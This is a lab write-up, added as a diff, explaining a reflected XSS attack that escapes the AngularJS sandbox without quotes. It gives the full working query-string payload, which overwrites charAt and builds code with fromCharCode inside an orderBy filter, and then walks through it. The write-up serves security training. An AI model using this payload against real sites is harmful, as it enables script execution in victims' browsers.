@@ -1,0 +1,59 @@
+Lab: Reflected XSS with AngularJS sandbox escape without strings
+Difficulty: Expert
+
+This one was all about breaking out of AngularJS’s sandbox without using quotes or $eval. So yeah — no 'alert(1)', no "x=...", no {{constructor("evil")}} shortcuts. You have to get creative.
+
+At first glance, the app just has a basic search field that reflects input inside an AngularJS expression like this:
+
+
+{{ expression goes here }}
+But trying anything normal fails. No $eval, no strings, nothing quoted — just gets blocked or sanitized. So the trick here is escaping the sandbox without using any strings at all. Which sounds brutal, but turns out there’s a sneaky way in.
+
+Here’s the payload that did the job:
+
+
+?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+Let’s break it down a bit.
+
+The first part:
+
+
+toString().constructor.prototype.charAt=[].join
+This overwrites charAt for all strings with [].join, which messes with how Angular evaluates strings internally — and that’s what weakens the sandbox.
+
+Then we use this line:
+
+
+[1]|orderBy:toString().constructor.fromCharCode(...)
+So [1] is just a dummy array. We’re passing it through the orderBy filter, and inside that, we call fromCharCode() to build up the payload using ASCII values. Here's what those character codes turn into:
+
+ini
+Copy
+Edit
+120 = x  
+61 = =  
+97 = a  
+108 = l  
+101 = e  
+114 = r  
+116 = t  
+40 = (  
+49 = 1  
+41 = )
+Put it all together: x=alert(1)
+
+And since Angular is now confused about how to handle strings (thanks to us replacing charAt), it ends up evaluating that just like any other expression. So the alert pops — sandbox escaped, no strings used.
+
+Lab complete.
+
+Why this works
+
+AngularJS uses charAt for security stuff. Overwriting it breaks its checks.
+
+fromCharCode() lets us create strings character-by-character, avoiding quotes
+
+orderBy is just a useful way to evaluate arbitrary expressions in Angular
+
+Takeaway
+
+Sandbox escapes always feel like black magic, but with Angular, if you mess with prototypes in the right way, the whole thing falls apart. This lab is a great reminder that even quote-less environments aren’t always safe.
